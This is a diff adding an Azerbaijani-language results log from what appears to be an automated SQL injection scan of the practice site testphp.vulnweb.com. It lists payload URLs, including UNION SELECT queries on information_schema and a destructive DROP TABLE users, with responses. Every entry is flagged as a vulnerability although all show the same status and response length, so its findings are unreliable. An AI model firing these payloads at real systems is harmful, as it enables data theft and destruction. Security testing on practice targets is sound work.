@@ -1,0 +1,41 @@
+SQL Injection Test Nəticələri
+==================================================
+
+Zəiflik tapıldı: http://testphp.vulnweb.com/artists.php?artist=' OR '1'='1' -- 
+Status kodu: 200, Cavab uzunluğu: 4853
+Cavab nümunəsi: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLoc...
+
+Zəiflik tapıldı: http://testphp.vulnweb.com/artists.php?artist=' UNION SELECT null, table_name FROM information_schema.tables --
+Status kodu: 200, Cavab uzunluğu: 4853
+Cavab nümunəsi: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLoc...
+
+Zəiflik tapıldı: http://testphp.vulnweb.com/artists.php?artist=' UNION SELECT null, column_name FROM information_schema.columns --
+Status kodu: 200, Cavab uzunluğu: 4853
+Cavab nümunəsi: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLoc...
+
+Zəiflik tapıldı: http://testphp.vulnweb.com/artists.php?artist=' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --
+Status kodu: 200, Cavab uzunluğu: 4853
+Cavab nümunəsi: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLoc...
+
+Zəiflik tapıldı: http://testphp.vulnweb.com/artists.php?artist='; DROP TABLE users; --
+Status kodu: 200, Cavab uzunluğu: 4853
+Cavab nümunəsi: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLoc...
+
+Zəiflik tapıldı: http://testphp.vulnweb.com/artists.php?artist=' OR 1=1; --
+Status kodu: 200, Cavab uzunluğu: 4853
+Cavab nümunəsi: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLoc...
+
+
+Test bitdi.
